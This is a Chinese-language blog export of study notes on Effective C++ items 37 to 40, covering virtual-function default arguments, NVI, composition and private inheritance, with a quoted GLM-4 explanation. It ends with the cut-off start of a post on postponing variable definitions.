class="code"><pre><span class="line"><span class="comment">// 几何形状的类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 枚举类型表示形状的颜色</span></span><br><span class="line">    <span class="keyword">enum</span> <span class="title class_">ShapeColor</span> &#123; Red, Green, Blue &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 所有形状都必须提供一个绘制自己的函数</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">draw</span><span class="params">(ShapeColor color = Red)</span> <span class="type">const</span> </span>= <span class="number">0</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 矩形类，继承自Shape类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rectangle</span>: <span class="keyword">public</span> Shape &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 注意不同的默认参数值 — 不好！</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">draw</span><span class="params">(ShapeColor color = Green)</span> <span class="type">const</span></span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 圆形类，继承自Shape类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Circle</span>: <span class="keyword">public</span> Shape &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">draw</span><span class="params">(ShapeColor color)</span> <span class="type">const</span></span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>现在考虑这些 pointer：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Shape *ps;                      </span><br><span class="line">Shape *pc = <span class="keyword">new</span> Circle;          </span><br><span class="line">Shape *pr = <span class="keyword">new</span> Rectangle;       </span><br></pre></td></tr></table></figure><p>ps，pc 和 pr 全被声明为 <code>pointer-to-Shape</code> 类型，它们的静态类型都是 Shape*。</p><p>一个对象的动态类型取决于它当前引用的对象的类型。也就是说，<code>动态类型</code>表明它有怎样的行为。在上面的例子中，pc 的<code>动态类型</code>是 Circle<em>，而 pr 的 <code>动态类型</code>是 Rectangle</em>。至于 ps，它没有一个实际的 <code>动态类型</code>。</p><p><code>动态类型</code>，就像它的名字所暗示的，能在程序运行中变化，特别是通过 assignments（赋值）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps = pc; <span class="comment">// ps的动态类型现在是 Circle*</span></span><br><span class="line">ps = pr; <span class="comment">// ps的动态类型现在是 Rectangle*</span></span><br></pre></td></tr></table></figure><p><code>virtual functions</code>是 <code>动态绑定</code>，意味着被调用的特定函数取决于被用来调用它的那个<code>对象</code>的<code>动态类型</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pc-&gt;<span class="built_in">draw</span>(Shape::Red);             <span class="comment">// calls Circle::draw(Shape::Red)</span></span><br><span class="line">pr-&gt;<span class="built_in">draw</span>(Shape::Red);             <span class="comment">// calls Rectangle::draw(Shape::Red)</span></span><br></pre></td></tr></table></figure><p>但是当你考虑带有缺省参数值的virtual 函数，花样来了，因为就如我稍早所说，<code>virtual 函数是动态绑定，而缺省参数值却是静态绑定</code>。意思是你可能会在“调用一个定义于derived class 内的virtual 函数”的同时，却使用<code>base class 为它所指定的缺省参数值</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pr-&gt;<span class="built_in">draw</span>(); <span class="comment">// calls Rectangle::draw(Shape::Red)!</span></span><br></pre></td></tr></table></figure><p>可以看到使用了<code>Shape</code>的缺省参数。</p><blockquote><p>我：为什么c++virtual functions（虚拟函数）是 dynamically bound（动态绑定），而 default parameter values（缺省参数值）是 statically bound（静态绑定）。</p><p>GLM-4：</p><p>C++中虚拟函数（virtual functions）是动态绑定的，而缺省参数值（default parameter values）是静态绑定的，这是由于C++语言的设计和实现机制决定的。</p><p><strong>虚拟函数的动态绑定：</strong></p><ol><li><strong>多态性</strong>：C++的面向对象编程支持多态性，允许通过基类指针或引用调用派生类的函数。动态绑定是实现多态性的关键，它确保了在运行时能够根据对象的实际类型来调用正确的函数版本。</li><li><strong>虚函数表（vtable）</strong>：C++通过虚函数表来实现动态绑定。每个包含虚函数的类都有一个与之关联的虚函数表，表中包含了该类的虚函数的地址。当一个对象被创建时，它的构造函数会初始化一个指向其虚函数表的指针。当通过指针或引用调用一个虚函数时，实际调用的函数地址是从虚函数表中获取的，而不是在编译时确定的。</li><li><strong>运行时类型信息（RTTI）</strong>：C++的运行时类型信息允许程序在运行时查询对象的实际类型。这是通过虚函数表和类型信息实现的，它使得动态绑定成为可能。</li></ol><p><strong>缺省参数值的静态绑定：</strong></p><ol><li><strong>编译时确定</strong>：缺省参数值是在编译时确定的，它们是函数签名的一部分。当编译器解析一个函数调用时，它会根据函数的声明来确定是否需要使用缺省参数值。这意味着缺省参数值与函数的静态类型相关联，而不是与对象的动态类型相关联。</li><li><strong>效率考虑</strong>：静态绑定缺省参数值可以提高效率，因为编译器可以在编译时确定所有需要的参数，而不需要在运行时进行额外的查找。</li><li><strong>一致性和可预测性</strong>：静态绑定缺省参数值确保了函数的行为是一致的，因为缺省参数值不会因为通过不同的指针或引用调用而改变。</li></ol><p>由于这些原因，C++中的虚拟函数是动态绑定的，而缺省参数值是静态绑定的。这种设计允许C++在提供多态性的同时保持编译时的类型检查和效率。然而，这也意味着在使用虚函数和缺省参数时需要特别注意，以避免由于静态绑定和动态绑定的不同而产生的混淆和错误。</p></blockquote><p>让我们给<code>Rectangle</code>加上默认参数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Rectangle</span>: <span class="keyword">public</span> Shape &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">draw</span><span class="params">(ShapeColor color = Red)</span> <span class="type">const</span></span>;</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>喔欧，代码重复。更糟的是，代码重复又带着相依性:如果Shape 内的缺省参数值改变了，所有“重复给定缺省参数值”的那些derived classes 也必须改变，简直就是项目维护的灾难！</p><h4 id="NVI！"><a href="#NVI！" class="headerlink" title="NVI！"></a>NVI！</h4><p>通过nvi手法，实现以下代码。由于non-virtual 函数应该绝对不被derived classes 覆写（见条款36) ，这个设计很清楚地使得draw 函数的color 缺省参数值总是为Red。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">enum</span> <span class="title class_">ShapeColor</span> &#123; Red, Green, Blue &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 现在是非虚函数</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">draw</span><span class="params">(ShapeColor color = Red)</span> <span class="type">const</span>           </span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="built_in">doDraw</span>(color);                                  <span class="comment">// 调用一个虚函数</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="comment">// 实际工作在这个函数中完成</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">doDraw</span><span class="params">(ShapeColor color)</span> <span class="type">const</span> </span>= <span class="number">0</span>;  </span><br><span class="line">&#125;;                                                  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rectangle</span>: <span class="keyword">public</span> Shape &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="comment">// 注意没有默认参数值</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">doDraw</span><span class="params">(ShapeColor color)</span> <span class="type">const</span></span>;       </span><br><span class="line">  ...                                               </span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="请记住-3"><a href="#请记住-3" class="headerlink" title="请记住"></a>请记住</h4><ul><li>绝对不要重新定义一个继承而来的缺省参数值，因为缺省参数值都是静态绑定，而virtual 函数——你唯一应该覆写的东西却是动态绑定。</li></ul><h3 id="38-Model-“has-a”-or-“is-implemented-in-terms-of”-through-composition"><a href="#38-Model-“has-a”-or-“is-implemented-in-terms-of”-through-composition" class="headerlink" title="38. Model “has-a” or “is-implemented-in-terms-of” through composition."></a>38. Model “has-a” or “is-implemented-in-terms-of” through composition.</h3><ul><li><p>复合(composition) 是类型之间的一种关系，当某种类型的对象内含它种类型的对象，便是这种关系。</p></li><li><p>复合意味<code>has-a （有一个）</code>或<code>is-implemented-in-terms-of（根据某物实现出）</code></p></li><li>在<code>应用域(application domain)</code>，复合意味<code>has-a （有一个）</code>。在<code>实现域(implementation domain)</code> ，复合意味<code>is-implemented-in-terms-of （根据某物实现出）</code>。</li></ul><p>那么什么对象是应用域、实现域？</p><ul><li>应用域：人、汽车、一张张视频画面等等。</li><li>实现域：缓冲区(buffers) 、互斥器Cmutexes) 、查找树(search trees) 等等。</li></ul><p>下面的Person 对象由<code>string, Address, PhoneNurnber</code> 构成。属于<code>应用域</code>，那该复合则为<code>has-a （有一个）</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Address</span> &#123; ... &#125;;             <span class="comment">// 住址类，表示一个人的居住地</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PhoneNumber</span> &#123; ... &#125;;         <span class="comment">// 电话号码类，表示一个电话号码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::string name;               <span class="comment">// 字符串对象，存储人的姓名</span></span><br><span class="line">  Address address;                <span class="comment">// Address对象，存储人的居住地址</span></span><br><span class="line">  PhoneNumber voiceNumber;        <span class="comment">// PhoneNumber对象，存储人的语音电话号码</span></span><br><span class="line">  PhoneNumber faxNumber;          <span class="comment">// PhoneNumber对象，存储人的传真号码</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么什么情况下是<code>is-implemented-in-terms-of （根据某物实现出）</code>？</p><p> 假设我们想重新定义一个<code>set</code>，默认的<code>set</code>存储一个节点需要三个指针（基于红黑树等数据结构实现）。在日常使用情况下没有问题，但是我们写出的程序要求空间比速度重要呢？例如<code>set</code> 不得不存储大量数据。</p><p>在这里，我们使用<code>linked list</code>来实现它。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;                   <span class="comment">// 使用列表表示集合的正确方式</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Set</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">member</span><span class="params">(<span class="type">const</span> T&amp; item)</span> <span class="type">const</span></span>;  <span class="comment">// 成员函数：检查集合中是否包含特定项</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">const</span> T&amp; item)</span></span>;        <span class="comment">// 成员函数：向集合中插入项</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">remove</span><span class="params">(<span class="type">const</span> T&amp; item)</span></span>;        <span class="comment">// 成员函数：从集合中移除项</span></span><br><span class="line"></span><br><span class="line">  <span class="function">std::<span class="type">size_t</span> <span class="title">size</span><span class="params">()</span> <span class="type">const</span></span>;          <span class="comment">// 成员函数：返回集合大小</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::list&lt;T&gt; rep;                 <span class="comment">// 集合数据的表示</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为什么我们不直接public继承<code>list</code>?</p><p>因为如果以public继承<code>list</code>，那么将会允许<code>set</code>持有相同元素，这显然是不正确的，这里我们使用private继承</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;                   <span class="comment">// 使用 list 作为 Set 的正确方式</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Set</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">member</span><span class="params">(<span class="type">const</span> T&amp; item)</span> <span class="type">const</span></span>;   <span class="comment">// 成员函数：检查元素是否存在</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">const</span> T&amp; item)</span></span>;         <span class="comment">// 成员函数：插入元素</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">remove</span><span class="params">(<span class="type">const</span> T&amp; item)</span></span>;         <span class="comment">// 成员函数：移除元素</span></span><br><span class="line">  <span class="function">std::<span class="type">size_t</span> <span class="title">size</span><span class="params">()</span> <span class="type">const</span></span>;           <span class="comment">// 成员函数：返回集合大小</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::list&lt;T&gt; rep;                   <span class="comment">// 用于存储集合数据的表示</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="type">bool</span> Set&lt;T&gt;::<span class="built_in">member</span>(<span class="type">const</span> T&amp; item) <span class="type">const</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> std::<span class="built_in">find</span>(rep.<span class="built_in">begin</span>(), rep.<span class="built_in">end</span>(), item) != rep.<span class="built_in">end</span>();  <span class="comment">// 使用 std::find 查找元素</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="type">void</span> Set&lt;T&gt;::<span class="built_in">insert</span>(<span class="type">const</span> T&amp; item)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">member</span>(item)) rep.<span class="built_in">push_back</span>(item);   <span class="comment">// 如果元素不存在，则将其插入到列表末尾</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="type">void</span> Set&lt;T&gt;::<span class="built_in">remove</span>(<span class="type">const</span> T&amp; item)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">typename</span> std::list&lt;T&gt;::iterator it = std::<span class="built_in">find</span>(rep.<span class="built_in">begin</span>(), rep.<span class="built_in">end</span>(), item);  <span class="comment">// 查找元素位置</span></span><br><span class="line">  <span class="keyword">if</span> (it != rep.<span class="built_in">end</span>()) rep.<span class="built_in">erase</span>(it);     <span class="comment">// 如果找到元素，则移除</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">std::<span class="type">size_t</span> Set&lt;T&gt;::<span class="built_in">size</span>() <span class="type">const</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> rep.<span class="built_in">size</span>();   <span class="comment">// 返回列表大小作为集合大小</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="请记住-4"><a href="#请记住-4" class="headerlink" title="请记住"></a>请记住</h4><ul><li>复合(composition) 的意义和public 继承完全不同。</li><li>在<code>应用域(application domain)</code>，复合意味<code>has-a （有一个）</code>。在<code>实现域(implementation domain)</code> ，复合意味<code>is-implemented-in-terms-of （根据某物实现出）</code>。</li></ul><h3 id="39-Use-private-inheritance-judiciously"><a href="#39-Use-private-inheritance-judiciously" class="headerlink" title="39. Use private inheritance judiciously."></a>39. Use private inheritance judiciously.</h3><p>当以public继承时，编译器在必要时刻（为了让函数调用成功）将students 暗自转换为Persons 。</p><p>考虑如下例子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123; ... &#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>: <span class="keyword">private</span> Person &#123; ... &#125;;     <span class="comment">// 继承关系现在是私有的</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">(<span class="type">const</span> Person&amp; p)</span></span>;                 <span class="comment">// 任何人都可以吃饭</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">study</span><span class="params">(<span class="type">const</span> Student&amp; s)</span></span>;              <span class="comment">// 只有学生才能学习</span></span><br><span class="line"></span><br><span class="line">Person p;                                  <span class="comment">// p 是一个 Person</span></span><br><span class="line"></span><br><span class="line">Student s;                                 <span class="comment">// s 是一个 Student</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">eat</span>(p);                                    <span class="comment">// 没问题，p 是一个 Person</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">eat</span>(s);                                    <span class="comment">// 错误！一个 Student 不是一个 Person,难道学生不是人吗</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>private继承：</p><ul><li>如果classes 之间的继承关系是private, 编译器不会自动将一个derived class 对象（例如Student) 转换为一个base class 对象（例如Person) 。</li><li>由private base class 继承而来的所有成员，在derived class 中都会变成<code>private 属性</code>，纵使它们在base class 中原本是protected 或public 属性。</li><li>借用条款34 提出的术语， private 继承意味只有实现部分被继承，接口部分应略去。</li></ul><p>Private 继承意味<code>is-implemented-in-terms-of （根据某物实现出）</code>，这个事实有点令人不安，因为条款38 才刚指出<code>复合(composition) 的意义</code>也是这样。你如何在两者之间取舍？</p><p>答案很简单：尽可能使用复合，必要时才使用private 继承。何时才是必要？主要是当protected 成员或virtual 函数牵扯进来的时候。其实还有一种激进情况，那是当空间方面的利害关系足以踢翻private 继承的支柱时。</p><p>假设我们需要定时对<code>Widget</code>对象状态进行检测，那么继承一个<code>Timer</code>类来定时实现他,当使用public继承：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Timer</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">Timer</span><span class="params">(<span class="type">int</span> tickFrequency)</span></span>;</span><br><span class="line">   <span class="comment">// 每个滴答周期自动调用的函数</span></span><br><span class="line">   <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">onTick</span><span class="params">()</span> <span class="type">const</span></span>;          </span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们不想让客户可以调用这个函数，毕竟这不是<code>Widget</code>的一部分，违反条款18 的忠告：“让接口容易被正确使用，不易被误用＂。改用<code>private继承</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Widget</span>: <span class="keyword">private</span> Timer &#123;<span class="comment">//Timer定义必须可见</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="comment">// 在时钟周期内观察 Widget 使用数据等</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">onTick</span><span class="params">()</span> <span class="type">const</span></span>;           </span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是<code>private继承</code>相较于<code>复合</code>,有点不好：</p><ul><li>我们不能阻止<code>derived class</code>重新定义<code>OnTick</code>。</li></ul><blockquote><p>即使基类的公有和保护成员在派生类中变为私有成员，派生类仍然可以通过重写基类中的虚函数来提供自己的实现。这是因为虚函数的覆盖是基于对象的实际类型，而不是基于继承的访问权限。因此，即使使用了私有继承，派生类仍然可以重写基类中的虚函数，以提供多态行为。</p></blockquote><ul><li>编译依存性较高</li><li>//TODO</li></ul><p>那么，让我们来看一下<code>复合</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Widget</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">WidgetTimer</span>: <span class="keyword">public</span> Timer &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">onTick</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">    ...</span><br><span class="line">  &#125;;</span><br><span class="line">   WidgetTimer timer;</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这种情况下，<code>Widget子类</code>无法重新定义<code>onTrick</code>函数。</p><p>虽然在大多数情况下<code>复合</code>更适合，但是<code>private</code>继承在一定情况下更适合。</p><p>考虑如下例子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">private</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> derived_data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(Base) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(Derived) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="comment">//4</span></span><br></pre></td></tr></table></figure><p>可以看到，空白基类也要占用一个字节的大小。而在派生子类，继承的空白基类不占大小。C++ 裁定凡是<code>独立（非附属）对象都必须有非零大小</code>。</p><p>//TODO</p><p>EBO?</p><h3 id="Use-multiple-inheritance-judiciously"><a href="#Use-multiple-inheritance-judiciously" class="headerlink" title="Use multiple inheritance judiciously"></a>Use multiple inheritance judiciously</h3><p>//TODO</p><h4 id="请记住-5"><a href="#请记住-5" class="headerlink" title="请记住"></a>请记住</h4>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> effective cpp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> effective cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EffectiveCpp0x5</title>
      <link href="/2024/04/19/C&amp;C++/Effective%20Cpp0x5/"/>
      <url>/2024/04/19/C&amp;C++/Effective%20Cpp0x5/</url>
      
        <content type="html"><![CDATA[<h1 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h1><p>[toc]</p><h3 id="26-Postpone-variable-definitions-as-long-as-possible"><a href="#26-Postpone-variable-definitions-as-long-as-possible" class="headerlink" title="26. Postpone variable definitions as long as possible."></a>26. Postpone variable definitions as long as possible.</h3><p>只要你定义了一个变量而其类型带有一个构造函数或析构函数，那么当程序的控制流(control flow) 到达这个变量定义式时，你便得承受构造成本；当这个变量离开其作用域时，你便得承受析构成本。即使这个变量最终并未被使用，仍需耗费这些成本，所以你应该尽可能避免这种情形。</p><h4 id="考虑一个加密函数"><a href="#考虑一个加密函数" class="headerlink" title="考虑一个加密函数"></a>考虑一个加密函数</h4><p>当抛出一个异常时（如加密字符串长度过短），则该encrypted字符串将未被使用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// this function defines the variable &quot;encrypted&quot; too soon</span></span><br><span class="line"><span class="function">std::string <span class="title">encryptPassword</span><span class="params">(<span class="type">const</span> std::string&amp; password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">  string encrypted;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (password.<span class="built_in">length</span>() &lt; MinimumPasswordLength) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="built_in">logic_error</span>(<span class="string">&quot;Password is too short&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ...                        <span class="comment">// do whatever is necessary to place an</span></span><br><span class="line">                             <span class="comment">// encrypted version of password in encrypted</span></span><br><span class="line">  <span class="keyword">return</span> 